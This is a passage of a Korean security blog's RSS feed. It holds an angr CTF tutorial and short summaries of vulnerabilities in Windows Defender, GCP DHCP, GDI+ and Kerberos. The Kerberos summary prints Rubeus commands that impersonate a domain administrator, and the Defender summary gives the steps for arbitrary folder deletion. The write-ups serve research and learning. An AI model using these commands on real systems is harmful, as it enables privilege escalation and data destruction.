있습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr = proj.factory.simulation_manager(state)<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active[&lt;SimState @ <span class="hljs-number">0x8048450</span>&gt;]<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.step()&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active[<span class="hljs-number">0</span>].regs.eip&lt;BV32 <span class="hljs-number">0x8048420</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.step()&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active[<span class="hljs-number">0</span>].regs.eip&lt;BV32 <span class="hljs-number">0x8100014</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.eip&lt;BV32 <span class="hljs-number">0x8048450</span>&gt;</code></pre><p>이렇게 Simulation Manager에서 step() 함수를 사용하면 eip가 바뀌는 것을 볼 수 있습니다. 호호 factory는 오늘은 이정도만 알아볼텐데… 나중에 많이 만날거 같은 불안한 느낌… 하하…(스포)</p><h2 id="Analyses"><a href="#Analyses" class="headerlink" title="Analyses"></a>Analyses</h2><p>angr에서는 사용자가 하나부터 열까지 다 분석하고 삽질하며 시간 낭비를 하지 않도록 수많은 분석 툴들을 제공합니다. 그 툴들이 내장되어 있는 클래스가 바로 Analyses 입니다! 아래와 같이 정말 많은 기능이 있는데, 각각의 기능은 추후에 직접 써보면서 소개해드리도록 하겠습니다. 그래도 다 소개하는 무리데스…</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.analyses.proj.analyses.AILBlockSimplifier(              proj.analyses.Decompiler(                      proj.analyses.StructuredCodeGenerator(proj.analyses.AILCallSiteMaker(                proj.analyses.Disassembly(                     proj.analyses.Structurer(proj.analyses.AILSimplifier(                   proj.analyses.DivSimplifier(                   proj.analyses.Typehoon(proj.analyses.BackwardSlice(                   proj.analyses.DominanceFrontier(               proj.analyses.VFG(proj.analyses.BasePointerSaveSimplifier(       proj.analyses.EagerReturnsSimplifier(          proj.analyses.VSA_DDG(proj.analyses.BinDiff(                         proj.analyses.Identifier(                      proj.analyses.VariableRecovery(proj.analyses.BinaryOptimizer(                 proj.analyses.ImportSourceCode(                proj.analyses.VariableRecoveryFast(proj.analyses.BoyScout(                        proj.analyses.InitFinder(                      proj.analyses.Veritesting(proj.analyses.CDG(                             proj.analyses.InitializationFinder(            proj.analyses.XRefs(proj.analyses.CFB(                             proj.analyses.LoopFinder(                      proj.analyses.discard_plugin_preset(proj.analyses.CFBlanket(                       proj.analyses.ModSimplifier(                   proj.analyses.get_plugin(proj.analyses.CFG(                             proj.analyses.MultiSimplifier(                 proj.analyses.has_plugin(proj.analyses.CFGEmulated(                     proj.analyses.Propagator(                      proj.analyses.has_plugin_presetproj.analyses.CFGFast(                         proj.analyses.Proximity(                       proj.analyses.plugin_presetproj.analyses.CFGFastSoot(                     proj.analyses.ReachingDefinitions(             proj.analyses.projectproj.analyses.CalleeCleanupFinder(             proj.analyses.Reassembler(                     proj.analyses.register_default(proj.analyses.CallingConvention(               proj.analyses.RecursiveStructurer(             proj.analyses.register_plugin(proj.analyses.Clinic(                          proj.analyses.RegionIdentifier(                proj.analyses.register_preset(proj.analyses.CodeTagging(                     proj.analyses.RegionSimplifier(                proj.analyses.release_plugin(proj.analyses.CompleteCallingConventions(      proj.analyses.SootClassHierarchy(              proj.analyses.reload_analyses(proj.analyses.CongruencyCheck(                 proj.analyses.StackCanarySimplifier(           proj.analyses.use_plugin_preset(proj.analyses.ConstantDereferencesSimplifier(  proj.analyses.StackPointerTracker(proj.analyses.DDG(                             proj.analyses.StaticHooker(</code></pre><h1 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h1><p>그냥 설명만 하다 끝내기는 아쉬우니까 간단하게 튜토리얼 문제 하나만 보고 마무리할게요. 이 <a href="https://github.com/jakespringer/angr_ctf">링크</a>로 들어가셔서 레포를 클론해줍니다. 이 레포는 angr의 기능을 ctf 문제 스타일로 하나하나 공부하기에 적합해 보여서 가져와 봤어요. 00_angr_find는 그 첫번째 문제입니다!</p><pre><code class="hljs python">$&#123;<span class="hljs-keyword">import</span> random, osrandom.seed(os.urandom(<span class="hljs-number">8</span>))userdef_charset = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>userdef = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(userdef_charset) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>))&#125;$<span class="hljs-comment">#include &lt;stdio.h&gt;</span><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><span class="hljs-comment">#include &lt;string.h&gt;</span><span class="hljs-comment">#define USERDEF &quot;$&#123; userdef &#125;$&quot;</span><span class="hljs-comment">#define LEN_USERDEF $&#123; write(len(userdef)) &#125;$</span>char msg[] =  <span class="hljs-string">&quot;$&#123; description &#125;$&quot;</span>;void print_msg() &#123;  printf(<span class="hljs-string">&quot;%s&quot;</span>, msg);&#125;int complex_function(int value, int i) &#123;<span class="hljs-comment">#define LAMBDA 3</span>  <span class="hljs-keyword">if</span> (!(<span class="hljs-string">&#x27;A&#x27;</span> &lt;= value &amp;&amp; value &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>)) &#123;    printf(<span class="hljs-string">&quot;Try again.\\n&quot;</span>);    exit(<span class="hljs-number">1</span>);  &#125;  <span class="hljs-keyword">return</span> ((value - <span class="hljs-string">&#x27;A&#x27;</span> + (LAMBDA * i)) % (<span class="hljs-string">&#x27;Z&#x27;</span> - <span class="hljs-string">&#x27;A&#x27;</span> + <span class="hljs-number">1</span>)) + <span class="hljs-string">&#x27;A&#x27;</span>;&#125;int main(int argc, char* argv[]) &#123;  char buffer[<span class="hljs-number">9</span>];  //print_msg();  printf(<span class="hljs-string">&quot;Enter the password: &quot;</span>);  scanf(<span class="hljs-string">&quot;%8s&quot;</span>, buffer);  <span class="hljs-keyword">for</span> (int i=<span class="hljs-number">0</span>; i&lt;LEN_USERDEF; ++i) &#123;    buffer[i] = complex_function(buffer[i], i);  &#125;  <span class="hljs-keyword">if</span> (strcmp(buffer, USERDEF)) &#123;    printf(<span class="hljs-string">&quot;Try again.\\n&quot;</span>);  &#125; <span class="hljs-keyword">else</span> &#123;    printf(<span class="hljs-string">&quot;Good Job.\\n&quot;</span>);  &#125;&#125;</code></pre><p>코드를 보면 유저가 인풋을 넣으면 인풋을 바탕으로 어떤 연산 작업을 실행하고 그 결과 값을 컴파일 당시 랜덤하게 생성된 문자열과 비교하는 것을 알 수 있습니다. 그러면 우리가 해야하는 것은 연산 결과가 해당 문자열과 일치하는 인풋을 찾아야겠군요! 즉, main 함수에서 printf(“Good Job.\n”); 이 실행될 수 있도록 해야한다는 거죠. 쉽죠? 이정도는 angr한테는 껌이겠죠? 이제 위 코드를 컴파일하고 아래 코드를 돌려봅시다!</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    proj = angr.Project(<span class="hljs-string">&#x27;00_angr_find&#x27;</span>)    init_state = proj.factory.entry_state()    simulation = proj.factory.simgr(init_state)    print_good = <span class="hljs-number">0x804867d</span>    simulation.explore(find=print_good)    <span class="hljs-keyword">if</span> simulation.found:        solution = simulation.found[<span class="hljs-number">0</span>]        print(<span class="hljs-string">&#x27;flag: &#x27;</span>, solution.posix.dumps(<span class="hljs-number">0</span>))    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">&#x27;no solution&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()</code></pre><p>컴파일된 바이너리를 IDA로 확인해서 printf(“Good Job.\n”);의 주소를 알아냅니다.(주소는 바뀔 수 있으니 각자 한번 확인해보세요) 그리고 simulation.explore(find=print_good)를 통해 값을 탐색합니다. 그리고 찾아지면 끝! 진짜 쉽죠? 아 물론 문제가 쉬워서 그럽니다 쿠쿸… 아직 이정도는 찍먹이라고 할 수도 없는 수준이죠.</p><h1 id="마무리…"><a href="#마무리…" class="headerlink" title="마무리…"></a>마무리…</h1><p>도대체 angr에서는 저 explore 함수에서 무슨 짓을 했길래 정답을 찾아낼 수 있었던 걸까요? 아마 여러분이 angr하면 떠오르는 키워드가 몇 가지 있을텐데, 바로 Symbolic Execution 덕분 입니다.</p><p>예… 다음 글 주제는 Symbolic Execution입니다!! 하하… 이번 편도 재미는 별로 없다고 생각이 드는데 다음 글은 어떡하지…하씨</p><p>그래도 마무리되었으니까 기쁜 마음으로 퇴근!!</p><p><img src="/2021/07/10/j0ker/angr_part1/1625731445.gif" alt="4"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/angr/">angr</category>
      
      <category domain="https://hackyboiz.github.io/tags/exploit/">exploit</category>
      
      <category domain="https://hackyboiz.github.io/tags/symbolic-execution/">symbolic_execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/newbie/">newbie</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/10/j0ker/angr_part1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] mpengine: asprotect embedded runtime dll memory corruption</title>
      <link>https://hackyboiz.github.io/2021/07/09/j0ker/2021-07-09/</link>
      <guid>https://hackyboiz.github.io/2021/07/09/j0ker/2021-07-09/</guid>
      <pubDate>Fri, 09 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/det</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2189">https://bugs.chromium.org/p/project-zero/issues/detail?id=2189</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Defender</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defender는 여느 안티바이러스와 같이 수 많은 포맷을 분석 및 검사할 수 있는 메커니즘을 가지고 있습니다. 2018년, 마이크로소프트는 Defender를 샌드박싱한다고 밝혔지만 디폴트로 설정되어 있지는 않습니다. 따라서 Defender에서 파일을 분석할 때, 파일 파서, 언패커, 인터프리터 그리고 에뮬레이터는 여전히 SYSTEM 권한으로 실행됩니다.</p><p>이 취약점은 Denfender에서 <code>ASProtect</code>로 패킹된 바이너리를 언패킹할 때 발생합니다. Defender에서는 패킹된 바이너리를 분석할 때, 패커의 파일 포맷를 바탕으로 바이너리에서 정보를 파싱하는게 아니라 에뮬레이터를 통해 바이너리를 실행하여 바이너리가 알아서 언패킹하도록 유도합니다. <code>ASProtect</code>는 언패킹 과정에서 내재된 DLL을 파일시스템에 떨구고, 해당 DLL을 에뮬레이터로 활용하여 메인 바이너리 안에 있는 바이트 코드를 실행하면서 언패킹을 진행합니다. 에뮬레이터로 활용되는 DLL 역시 패킹이 되어 있지만 특별한 검사는 하지 않습니다. 취약점은 바로 이 DLL의 <code>IMAGE_SECTION_HEADER</code> 구조체를 파싱할 때 발생합니다.</p><pre><code class="hljs c++">NtHdr = (IMAGE_NT_HEADERS *)((<span class="hljs-keyword">char</span> *)ImagePtr + ImagePtr-&gt;e_lfanew);NtHdr-&gt;OptionalHeader.SizeOfImage = <span class="hljs-keyword">this</span>-&gt;ImageSize;NtHdr-&gt;OptionalHeader.ImageBase = <span class="hljs-keyword">this</span>-&gt;ImageBase;NtHdr-&gt;OptionalHeader.AddressOfEntryPoint = <span class="hljs-keyword">this</span>-&gt;EntryPoint;NtHdr-&gt;OptionalHeader.SizeOfHeaders = <span class="hljs-number">4096</span>;TotalSects = <span class="hljs-keyword">this</span>-&gt;LastSection - <span class="hljs-keyword">this</span>-&gt;FirstSection) / <span class="hljs-keyword">sizeof</span>(EMBEDDED_SECTION);<span class="hljs-comment">// ...</span><span class="hljs-keyword">do</span>&#123;  SectHdrs-&gt;VirtualAddress = *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset);  SectHdrs-&gt;PointerToRawData = *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset);  <span class="hljs-comment">//  IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE</span>  SectHdrs-&gt;Characteristics = <span class="hljs-number">0xE0000020</span>;  CurrSect = (EMBEDDED_SECTION *)((<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span>-&gt;FirstSection + Offset);  <span class="hljs-keyword">if</span> ( SectNum &gt;= NumSects )    EndAddress = <span class="hljs-keyword">this</span>-&gt;ImageSize;  <span class="hljs-keyword">else</span>    EndAddress = CurrSect[<span class="hljs-number">1</span>].VirtualAddress;  VirtualSize = EndAddress - CurrSect-&gt;VirtualAddress;  SectHdrs-&gt;Misc.VirtualSize = VirtualSize;  SectHdrs-&gt;SizeOfRawData = VirtualSize;  StringCchPrintfA((<span class="hljs-keyword">char</span> *)SectHdrs, <span class="hljs-number">8u</span>, <span class="hljs-string">&quot;.sect%d&quot;</span>, SectNum);  memcpy_s_0(    &amp;<span class="hljs-keyword">this</span>-&gt;ImagePtr[*(<span class="hljs-keyword">int</span> *)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset)],    <span class="hljs-keyword">this</span>-&gt;ImageSize - *(<span class="hljs-keyword">int</span> *)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset),    *(<span class="hljs-keyword">void</span> **)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;PointerToData + Offset),    *(<span class="hljs-keyword">int</span> *)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;SectSize + Offset));</code></pre><p>위 코드에서는 DLL에 저장된 <code>RVA(Relative Virtual Address)</code>를 아무런 검증 없이 가져옵니다. 그런 다음, 이를 마지막 <code>memcpy</code>에서 버퍼의 오프셋으로 사용하는데, 이 때 임의로 넣은 <code>RVA</code> 값을 통해 원하는 오프셋을 읽거나 쓸 수 있습니다. 익스플로잇이 될 경우, 이 작업은 에뮬레이터에서 진행되기 때문에 에뮬레이터 밖의 메모리를 읽거나 쓸 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/defender/">defender</category>
      
      <category domain="https://hackyboiz.github.io/tags/antivirus/">antivirus</category>
      
      <category domain="https://hackyboiz.github.io/tags/unpacking/">unpacking</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-read-write/">arbitrary_read_write</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/09/j0ker/2021-07-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] GCP VM takeover via DHCP flood attack</title>
      <link>https://hackyboiz.github.io/2021/07/08/fabu1ous/2021-07-08/</link>
      <guid>https://hackyboiz.github.io/2021/07/08/fabu1ous/2021-07-08/</guid>
      <pubDate>Thu, 08 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/irsl/gcp-dhcp-takeover-code-exec&quot;&gt;gcp-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irsl/gcp-dhcp-takeover-code-exec">gcp-dhcp-takeover-code-exec</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google’s Comput Engine Platform</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p><strong>아직 패치되지 않은 취약점입니다.</strong></p><p>ISC DHCP가 사용하는 랜덤 로직에서 취약점이 발견되었습니다. 해커는 이를 악용해 자신을 Metadata server로 가장하고 Google Cloud Platform(GCP)의 가상 머신(VM: Virtual Machine)을 장악할 수 있습니다.</p><p>ISC DHCP 클라이언트는 random() 함수를 통해 유사 난수를 생성합니다. 난수의 seed는 다음과 같은 3가지 값을 조합해 사용하는데, 유효한 범위 내에서 XID 예측이 가능해 dhcilent에 DHCP packet을 보낼 수 있습니다.</p><ul><li>프로세스가 시작된 시점의 unixtime</li><li>dhclient 프로세스의 pid</li><li>네트워크 인터페이스 카드 이더넷 주소(MAC)의 마지막 4 byte</li></ul><p>GCP VM은 ssh 공개키 분배와 같은 초기 설정 작업을 Metadata server에 크게 의존합니다. XID을 유추한 해커는 VM이 네트워크를 재설정하도록 유도할 수 있고 그 과정에서 자신을 Metadata server로 속여 원하는 ssh 공개키를 VM에 전달할 수 있습니다. 이후 해커는 ssh를 통해 원격 쉘에 자유자재로 접근할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/gcp/">gcp</category>
      
      <category domain="https://hackyboiz.github.io/tags/dhcp/">dhcp</category>
      
      <category domain="https://hackyboiz.github.io/tags/random/">random</category>
      
      <category domain="https://hackyboiz.github.io/tags/network/">network</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/08/fabu1ous/2021-07-08/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-1665: Windows 그래픽 드라이버 원격 코드 실행 취약점</title>
      <link>https://hackyboiz.github.io/2021/07/06/l0ch/2021-07-06/</link>
      <guid>https://hackyboiz.github.io/2021/07/06/l0ch/2021-07-06/</guid>
      <pubDate>Tue, 06 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.mcafee.com/blogs/other-blogs/mcafee-labs/anal</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/analyzing-cve-2021-1665-remote-code-execution-vulnerability-in-windows-gdi/">Analyzing CVE-2021-1665 – Remote Code Execution Vulnerability in Windows GDI+</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows의 그래픽 장치 인터페이스(Graphic Device Interface, GDI)에서 발견된 원격 코드 실행 취약점의 세부 정보가 공개되었습니다.</p><p>취약점은 <code>gdiplus.dll</code> 에서 EMF 파일을 파싱 할 때 발생합니다.</p><blockquote><p>EMF : WMF 파일의 확장으로 응용프로그램에서 이미지 또는 그래픽을 렌더링 할 수 있도록 하는 메타 파일</p></blockquote><p><code>Builtline::BuildAllLines</code> 함수에는 다음 루프 프로세스가 존재합니다.</p><ol><li><code>0x60</code> bytes 크기의 메모리를 할당</li><li><code>Builtline::BuiltLine</code>를 호출해 할당된 메모리에 데이터 복사</li><li><code>BuiltLine::GetUntrimmedCharacterCount</code> 함수를 호출하고 해당 함수의 반환 값(1)을 루프 카운터 더함</li><li>루프 카운터가 EMF 파일의 <code>Length</code> 필드보다 크면 루프 종료</li></ol><p>그러나 <code>BuiltLine::GetUntrimmedCharacterCount</code> 함수의 반환 값이 0이 되는 경우를 처리하는 코드가 없어 지정된 <code>Length</code> 필드 값 이상으로 루프가 실행되고 이는 데이터 손상과 원격 코드 실행으로 이어질 수 있습니다.</p><p>Microsoft는 <code>BuiltLine::GetUntrimmedCharacterCount</code> 함수의 반환 값을 확인하는 검사를 추가한 패치를 배포하였습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/gdi/">gdi</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/06/l0ch/2021-07-06/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Abusing Kerberos S4U2self local privilege escalation</title>
      <link>https://hackyboiz.github.io/2021/07/05/idioth/2021-07-05/</link>
      <guid>https://hackyboiz.github.io/2021/07/05/idioth/2021-07-05/</guid>
      <pubDate>Mon, 05 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/">Abusing Kerberos S4U2self for local privilege escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Kerberos S4U2self</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>티켓을 기반으로 동작하는 컴퓨터 네트워크 인증 암호화 프로토콜 Kerberos의 <a href="http://www.harmj0y.net/blog/activedirectory/S4U2pwnage/">S4U2self extension을 악용</a>하여 권한 상승이 가능합니다. 해당 기술은 새로 발견된 것은 아니며 <a href="https://github.com/GhostPack/Rubeus#constrained-delegation-abuse">Rubeus manual</a>과 <a href="https://exploit.ph/revisiting-delegate-2-thyself.html">Charlie Clark의 게시글</a>에서 상세 내용을 확인할 수 있습니다.</p><p>S4U2proxy와 관련된 시스템 간에 작업은 권한을 가진 계정이 활성화 되어 있어야 하지만, SPN을 사용하는 모든 사용자는 S4U2self를 호출할 수 있습니다. Active Directory에서 네트워크 서비스 계정과 AppPool identities는 컴퓨터 계정의 역할을 할 수 있습니다. 따라서 네트워크 서비스 계정으로 실행되는 MSSQL이나, AppPool을 사용하는 IIS 등이 실행 중일 경우 S4U2self를 호출하여 모든 유저가 자신의 서비스 티켓을 요청할 수 있습니다. 이를 통해 권한 상승을 하는 방법은 다음과 같습니다.</p><ol><li>TGT 가져오기</li></ol><p>S4U2self를 호출하기 위해서는 TGT 또는 컴퓨터 계정의 자격 증명이 필요합니다. 컴퓨터 계정의 TGT는 Rubues의<code>tgt::deleg</code> trick을 통해 가져올 수 있습니다.</p><pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;tgtdeleg /nowrap&quot;</span></code></pre><ol start="2"><li>SPN 수정</li></ol><p>위의 TGT를 사용하여 S4U2self를 호출하여 도메인 관리자에 대한 티켓을 요청할 수 있습니다. </p><pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;s4u /self /nowrap /impersonateuser:doadmin /ticket:base64blob&quot;</span></code></pre><p>기본적으로 S4U2self를 통해 가져온 티켓의 SPN은 해커가 실행 중인  <code>Computername$</code>으로 설정되어 있습니다. 따라서 유효한 SPN이 아니므로 티켓을 사용할 수 없지만, <code>tgssub</code>와 <code>/altservice</code>를 사용하여 해당 부분을 수정할 수 있습니다.</p><pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;tgssub /altservice:http/adsec-00.contoso.com /ticket:base64blob&quot;</span></code></pre><p>그 후 다른 호스트에서 티켓을 복사해 사용할 수 있습니다.</p><p><img src="https://cyberstoph.org/img/7_tgssub_ptt_2.png" alt="tgtdeleg"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/kerberos/">kerberos</category>
      
      <category domain="https://hackyboiz.github.io/tags/s4u2self/">s4u2self</category>
      
      <category domain="https://hackyboiz.github.io/tags/rubeus/">rubeus</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/05/idioth/2021-07-05/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-1170 - Microsoft Windows Defender Elevation of Privilege Vulnerability</title>
      <link>https://hackyboiz.github.io/2021/07/04/j0ker/2021-07-04/</link>
      <guid>https://hackyboiz.github.io/2021/07/04/j0ker/2021-07-04/</guid>
      <pubDate>Sun, 04 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://itm4n.github.io/cve-2020-1170-windows-defen</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://itm4n.github.io/cve-2020-1170-windows-defender-eop/">https://itm4n.github.io/cve-2020-1170-windows-defender-eop/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Defender</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defender는 두 가지 로그 파일, <code>MpCmdRun.log</code>와 <code>MpSigStub.log</code>를 사용하는데 이 둘 모두 <code>C:\Windows\Temp</code>에 저장합니다. 일반 유저 권한에서는 이 두 파일에 대한 Write 권한은 없지만 <code>C:\Windows\Temp</code>에 자유롭게 파일이나 디렉터리를 생성할 수 있습니다.</p><p>두 로그 파일 중 <code>MpCmdRun.log</code> 파일이 16MB보다 커지면, Windows Defender는 SYSTEM 권한으로 해당 파일의 이름을 <code>MpCmdRum.log.bak</code>으로 수정하고 같은 이름의 새로운 파일을 생성합니다. 하지만 <code>MpCmdRun.log.bak</code>이 존재하고 폴더라면, 폴더 안에 있는 파일들과 해당 폴더를 삭제하고 로그 파일을 생성합니다.</p><p>이 취약점을 트리거하기 위해서는 먼저 원하는 <code>MpCmdRun.log.bak</code>이라는 이름으로 삭제하고 싶은 폴더를 가리키는 Junction 폴더를 <code>C:\Windows\Temp</code>에 생성합니다. <code>Update-MpSignature -UpdateSource InternalDefinitionUpdateServer</code> 명령어를 40분 동안 무한반복 실행하여 <code>MpCmdRun.log</code>가 16MB보다 커지게 하면 취약점이 트리거 되어 원하는 폴더 및 그 아래 파일들을 지울 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/defender/">defender</category>
      
      <category domain="https://hackyboiz.github.io/tags/file-deletion/">file_deletion</category>
      
      <category domain="https://hackyboiz.github.io/tags/directory-deletion/">directory_deletion</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/04/j0ker/2021-07-04/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] 50 CVEs in 50 Days: Fuzzing Adobe Reader</title>
      <link>https://hackyboiz.github.io/2021/07/04/fabu1ous/50cve/</link>
      <guid>https://hackyboiz.github.io/2021/07/04/fabu1ous/50cve/</guid>
      <pubDate>Sun, 04 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;번역-추신&quot;&gt;&lt;a href=&quot;#번역-추신&quot; class=&quot;headerlink&quot; title=&quot;번역 추신&quot;&gt;&lt;/a&gt;번역 추신&lt;/h1&gt;&lt;p&gt;WinAFL 연구글을 쓰면서 타겟함수 찾기 위해 분석하는 방식을 좀 더 공부하기 위해 읽은 글입니다. 참</description>
        
      
      
      
